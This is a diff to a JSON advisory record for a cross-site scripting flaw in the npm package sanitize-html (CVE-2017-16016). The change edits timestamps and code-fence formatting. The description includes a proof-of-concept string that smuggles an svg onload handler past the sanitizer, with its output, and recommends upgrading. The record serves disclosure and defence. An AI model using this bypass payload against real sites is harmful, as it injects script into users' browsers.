@@ -1,6 +1,6 @@
 {
   "Severity": "MODERATE",
-  "UpdatedAt": "2018-11-09T17:46:08Z",
+  "UpdatedAt": "2023-09-08T23:04:55Z",
   "Package": {
     "Ecosystem": "NPM",
     "Name": "sanitize-html"
@@ -42,12 +42,12 @@
         "Value": "CVE-2017-16016"
       }
     ],
-    "Description": "Affected versions of `sanitize-html` are vulnerable to cross-site scripting when allowedTags includes at least one `nonTextTag`.\n\n## Proof of Concept\n\n```\nvar sanitizeHtml = require('sanitize-html');\n\nvar dirty = '!\u003ctextarea\u003e\u0026lt;/textarea\u0026gt;\u003csvg/onload=prompt`xs`\u0026gt;\u003c/textarea\u003e!';\nvar clean = sanitizeHtml(dirty, {\n    allowedTags: [ 'textarea' ]\n});\n\nconsole.log(clean);\n\n// !\u003ctextarea\u003e\u003c/textarea\u003e\u003csvg/onload=prompt`xs`\u003e\u003c/textarea\u003e!\n```\n\n\n## Recommendation\n\nUpdate to version 1.11.4 or later.",
+    "Description": "Affected versions of `sanitize-html` are vulnerable to cross-site scripting when allowedTags includes at least one `nonTextTag`.\n\n## Proof of Concept\n\n```js\nvar sanitizeHtml = require('sanitize-html');\n\nvar dirty = '!\u003ctextarea\u003e\u0026lt;/textarea\u0026gt;\u003csvg/onload=prompt`xs`\u0026gt;\u003c/textarea\u003e!';\nvar clean = sanitizeHtml(dirty, {\n    allowedTags: [ 'textarea' ]\n});\n\nconsole.log(clean);\n\n// !\u003ctextarea\u003e\u003c/textarea\u003e\u003csvg/onload=prompt`xs`\u003e\u003c/textarea\u003e!\n```\n\n\n## Recommendation\n\nUpdate to version 1.11.4 or later.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2018-11-09T17:47:23Z",
     "Severity": "MODERATE",
     "Summary": "Cross-Site Scripting in sanitize-html",
-    "UpdatedAt": "2023-01-09T05:03:39Z",
+    "UpdatedAt": "2023-09-08T23:04:55Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 0,
